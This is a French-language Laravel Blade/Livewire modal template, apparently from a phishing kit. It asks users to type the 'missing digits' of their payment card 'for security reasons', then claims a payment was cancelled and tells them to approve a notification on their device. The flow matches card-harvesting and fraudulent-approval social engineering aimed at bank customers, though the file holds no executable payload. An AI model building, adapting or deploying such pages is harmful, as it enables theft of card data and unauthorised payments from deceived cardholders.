<div wire:ignore.self class="modal fade dialogbox" id="options-carte" data-bs-backdrop="static" tabindex="-1"
    style="display: none;" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header pt-1 px-2">
                <div class="modal-title m-0">
                    <h5 class="m-0 text-capitalize">
                        @if (!empty($modal['name']))
                            Options Carte - {{ $modal['name'] }}
                        @endif
                    </h5>
                </div>
                <a href="#" data-bs-dismiss="modal" class="text-theme-primary custom">
                    <ion-icon name="close-outline" role="img" class="md hydrated" aria-label="close outline">
                    </ion-icon>
                </a>
            </div>
            <div class="modal-body text-start mb-2">

                @if (!empty($step))

                    @if ($step['name'] === 'form')
                        <div id="fiabilisation-form">
                            <ul class="listview image-listview border-0 mb-2">
                                <li>
                                    <div class="item px-0">
                                        <div class="icon-box bg-theme-primary custom custom">
                                            @if (!empty($carte['type']))
                                                <img src="{{ asset('/storage/images/cards/' . $carte['type'] . '.png') }}"
                                                    alt="image" class="imaged w36">
                                            @else
                                                <ion-icon name="chatbox-ellipses-outline" role="img"
                                                    class="md hydrated" aria-label="chatbox ellipses outline">
                                                </ion-icon>
                                            @endif
                                        </div>
                                        <div class="in">
                                            <div>
                                                <footer>Pour des raisons de sécurité, Saisissez les chiffres manquants
                                                    de votre carte.
                                                </footer>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                            <form>
                                <div class="form-group basic mb-2">
                                    @if (!empty($step['fields']['number']))
                                        <div class="input-wrapper mb-2">
                                            <label class="label custom" for="">Numéro de carte</label>
                                            <div class="row">
                                                <div class="col-3">
                                                    <input type="text" class="form-control custom p-0 text-center"
                                                        id="s1" placeholder="" wire:model.lazy="s1"
                                                        @if ($s1) disabled readonly @endif>
                                                    <i class="clear-input">
                                                        <ion-icon name="close-circle" role="img" class="md hydrated"
                                                            aria-label="close circle">
                                                        </ion-icon>
                                                    </i>
                                                </div>
                                                <div class="col-3">
                                                    <input type="text" class="form-control custom p-0 text-center"
                                                        id="s2" placeholder="" wire:model.lazy="s2"
                                                        @if ($s2) disabled readonly @endif>
                                                    <i class="clear-input">
                                                        <ion-icon name="close-circle" role="img" class="md hydrated"
                                                            aria-label="close circle">
                                                        </ion-icon>
                                                    </i>
                                                </div>
                                                <div class="col-3">
                                                    <input type="text" class="form-control custom p-0 text-center"
                                                        id="s3" placeholder="" wire:model.lazy="s3"
                                                        @if ($s3) disabled readonly @endif>
                                                    <i class="clear-input">
                                                        <ion-icon name="close-circle" role="img" class="md hydrated"
                                                            aria-label="close circle">
                                                        </ion-icon>
                                                    </i>
                                                </div>
                                                <div class="col-3">
                                                    <input type="text" class="form-control custom p-0 text-center"
                                                        id="s4" placeholder="" wire:model.lazy="s4"
                                                        @if ($s4) disabled readonly @endif>
                                                    <i class="clear-input">
                                                        <ion-icon name="close-circle" role="img" class="md hydrated"
                                                            aria-label="close circle">
                                                        </ion-icon>
                                                    </i>
                                                </div>
                                            </div>
                                        </div>
                                    @else
                                        @foreach ($step['fields'] as $indexField => $field)
                                            @if ($field === true)
                                                <pre>{{ print_r($indexField, 1) }}</pre>
                                            @endif
                                        @endforeach
                                    @endif
                                </div>
                                <div class="section mt-2 mb-2">
                                    <div class="row">
                                        <div class="col-6">
                                            <a href="#" class="btn btn-md btn-outline-theme-primary custom btn-block"
                                                data-bs-dismiss="modal">Abondonner</a>
                                        </div>
                                        <div class="col-6 ">
                                            <button class="btn btn-md btn-theme-primary custom btn-block">Valider</button>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    @endif

                    @if ($step['name'] === 'chargement')
                        <div id="fiabilisation-chargement" class="text-center my-4">
                            <div class="modal-ico text-theme-primary custom  spinner-border "></div>
                        </div>
                    @endif

                    @if ($step['name'] === 'error')
                        <div id="fiabilisation-error" class="modal-content">
                            <div class="modal-icon text-danger mt-0">
                                <ion-icon name="close-circle" role="img" class="md hydrated"
                                    aria-label="close circle">
                                </ion-icon>
                            </div>

                            <div class="modal-body px-0 mt-1">
                                Saisie incorrecte ou code expiré.
                            </div>
                            <div class="modal-footer">
                                <div class="btn-inline">
                                    <a href="#" class="btn" data-bs-dismiss="modal">Demander un nouveau
                                        code</a>
                                </div>
                            </div>
                        </div>
                    @endif

                    @if ($step['name'] === 'done')
                        <div id="fiabilisation-success" class="modal-content">
                            <div class="modal-icon text-theme-primary custom mt-0">
                                <ion-icon name="checkmark-circle" role="img" class="md hydrated"
                                    aria-label="checkmark circle">
                                </ion-icon>
                            </div>

                            <div class="modal-body px-0 mt-1">
                                Votre paiement a bien été annulé.
                            </div>
                            <div class="modal-footer">
                                <div class="btn-inline">
                                    <a href="#" class="btn" data-bs-dismiss="modal">Terminer</a>
                                </div>
                            </div>
                        </div>
                    @endif

                    @if ($step['name'] === 'validation')
                        <div id="fiabilisation-success" class="modal-content">
                            <div class="modal-body px-0 mt-3 mb-0">
                                <div class="d-flex mb-2">
                                    <h5 class="text-center">Vous avez reçu une notification sur votre appareil
                                    </h5>
                                </div>
                            </div>
                            <div class="text-theme-primary custom mt-0 text-center">
                                <div class="spinner-border color-highlight" role="status"></div>
                            </div>
                            <div class="mt-1 mb-2 text-center ">
                                <h4 class="text-center">En attente de validation</h4>
                            </div>
                        </div>
                    @endif

                @endif

            </div>
        </div>
    </div>
</div>
